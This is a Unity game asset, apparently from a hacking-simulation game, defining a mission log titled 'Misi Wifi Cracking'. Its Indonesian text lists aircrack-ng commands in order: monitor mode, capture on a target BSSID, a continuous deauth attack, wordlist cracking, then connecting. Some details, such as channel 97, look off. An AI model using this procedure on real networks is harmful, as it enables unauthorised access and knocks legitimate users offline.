@@ -1,0 +1,32 @@
+%YAML 1.1
+%TAG !u! tag:unity3d.com,2011:
+--- !u!114 &11400000
+MonoBehaviour:
+  m_ObjectHideFlags: 0
+  m_CorrespondingSourceObject: {fileID: 0}
+  m_PrefabInstance: {fileID: 0}
+  m_PrefabAsset: {fileID: 0}
+  m_GameObject: {fileID: 0}
+  m_Enabled: 1
+  m_EditorHideFlags: 0
+  m_Script: {fileID: 11500000, guid: ee6d512e31f864045ac3572e2f954690, type: 3}
+  m_Name: 0_LogMisi_Wifi Cracking
+  m_EditorClassIdentifier: 
+  nameLog: Misi Wifi Cracking
+  descLog: "- Langkah 1: Membuka software Terminal.\r\n- Langkah 2: Menginstall tool
+    aircrack-ng menggunakan perintah 'apt-get install aircrack-ng'.\r\n- Langkah
+    3: Melakukan konfigurasi interface jaringan dengan perintah 'iwconfig'.\r\n-
+    Langkah 4: Mengaktifkan mode monitor pada antarmuka wlan0 dengan perintah 'airmon-ng
+    start wlan0'.\r\n- Langkah 5: Konfigurasi interface jaringan kembali diperiksa
+    dengan perintah 'iwconfig'.\r\n- Langkah 6: Memulai pemindaian jaringan menggunakan
+    perintah 'airodump-ng wlan0mon'.\r\n- Langkah 7: Pemindaian jaringan spesifik
+    dilakukan pada channel 97 dan dengan BSSID 51:11:25:AB:A6:42 menggunakan perintah
+    'airodump-ng -w hack -c 97 -bssid 51:11:25:AB:A6:42'.\r\n- Langkah 8: Melakukan
+    serangan deauth ke 51:11:25:AB:A6:42 menggunakan perintah 'aireplay-ng --deauth
+    0 -a 51:11:25:AB:A6:42 wlan0mon'.\r\n- Langkah 9: Memeriksa isi direktori saat
+    ini dengan perintah 'ls'.\r\n- Langkah 10: Melakukan serangan keamanan menggunakan
+    file cap 'hack-01.cap' dan wordlist 'wordlists.txt' dengan perintah 'aircrack-ng
+    hack-01.cap -w wordlists.txt'.\r\n- Langkah 11: Memasukkan password wifi dan
+    melakukan koneksi.\r\n- Langkah 12: Menonaktifkan mode monitor pada antarmuka
+    wlan0mon menggunakan perintah 'airmon-ng stop wlan0mon'.\r\n- Langkah 13: Membuka
+    log misi.\r"
